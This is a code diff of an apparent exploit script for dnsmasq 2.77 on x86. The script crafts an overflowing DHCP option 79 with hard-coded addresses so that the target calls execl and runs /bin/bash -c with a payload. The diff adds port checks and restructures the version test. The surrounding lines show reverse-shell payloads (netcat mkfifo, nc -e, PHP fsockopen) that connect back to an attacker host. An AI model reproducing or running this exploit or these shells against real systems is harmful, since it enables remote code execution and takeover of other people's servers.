@@ -64,9 +64,19 @@ else:
 interpreter = str(args.interpreter)
 interpreter_arg = str(args.interpreter_arg)
 
-payload = ""
-bind_port = str(args.bind_port)
-reverse_port = str(args.reverse_port)
+bind_port = str(4444)
+reverse_port = str(4444)
+
+if 0 < int(args.bind_port) < 65535:
+    bind_port = str(args.bind_port)
+else:
+    print Base.c_error + "Bad bind port: " + str(args.bind_port) + " allow only 1 ... 65534 ports"
+
+if 0 < int(args.reverse_port) < 65535:
+    reverse_port = str(args.reverse_port)
+else:
+    print Base.c_error + "Bad reverse port: " + str(args.reverse_port) + " allow only 1 ... 65534 ports"
+
 reverse_host = str(args.reverse_host)
 
 # Payloads
@@ -82,6 +92,7 @@ reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");ex
 reverse_nc = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + reverse_host + " " + reverse_port + " >/tmp/f"
 reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port
 
+payload = ""
 if args.command is not None:
     payload = args.command
 else:
@@ -141,31 +152,34 @@ def add_string_in_data(addr_in_data, string):
 
 if __name__ == '__main__':
     option_79 = ""
-    if capacity == "x86" and dnsmasq_version == "2.77":
-        interpreter_addr = DATA_277x86
-        interpreter_arg_addr = DATA_277x86 + len(interpreter) + (4 - (len(interpreter) % 4)) + 1
-        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 1
+    if capacity == "x86":
+        if dnsmasq_version == "2.77":
+            interpreter_addr = DATA_277x86
+            interpreter_arg_addr = DATA_277x86 + len(interpreter) + (4 - (len(interpreter) % 4)) + 1
+            payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 1
 
-        option_79 += Base.pack16(0)  # mac_type
-        option_79 += "0" * 36        # JUNK
+            option_79 += Base.pack16(0)  # mac_type
+            option_79 += "0" * 36        # JUNK
 
-        option_79 += Base.pack32(NOPx86)      # EBX
-        option_79 += Base.pack32(NOPx86)      # ESI = ""
-        option_79 += Base.pack32(NOPx86)      # EDI = ""
-        option_79 += Base.pack32(0x08080DDE)  # EBP ; ret (JUNK)
+            option_79 += Base.pack32(NOPx86)      # EBX
+            option_79 += Base.pack32(NOPx86)      # ESI = ""
+            option_79 += Base.pack32(NOPx86)      # EDI = ""
+            option_79 += Base.pack32(0x08080DDE)  # EBP ; ret (JUNK)
 
-        option_79 += add_string_in_data(interpreter_addr, interpreter)  # Address: 0x0808c054
-        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
-        option_79 += add_string_in_data(payload_addr, payload)
+            option_79 += add_string_in_data(interpreter_addr, interpreter)  # Address: 0x0808c054
+            option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
+            option_79 += add_string_in_data(payload_addr, payload)
 
-        option_79 += Base.pack32(EXECL_277x86)          # execl
-        option_79 += Base.pack32(interpreter_addr)      # "/bin/bash"
-        option_79 += Base.pack32(interpreter_addr)      # "/bin/bash"
-        option_79 += Base.pack32(interpreter_arg_addr)  # "-c"
-        option_79 += Base.pack32(payload_addr)          # payload
+            option_79 += Base.pack32(EXECL_277x86)          # address of execl
+            option_79 += Base.pack32(interpreter_addr)      # address of interpreter
+            option_79 += Base.pack32(interpreter_addr)      # address of interpreter
+            option_79 += Base.pack32(interpreter_arg_addr)  # address of interpreter argument
+            option_79 += Base.pack32(payload_addr)          # address of payload
+        else:
+            print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " not yet supported!"
+            exit(1)
     else:
-        print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " or capacity: " + capacity + \
-              " not yet supported!"
+        print Base.c_error + "This capacity: " + capacity + " not yet supported!"
         exit(1)
     
     pkg = b"".join([
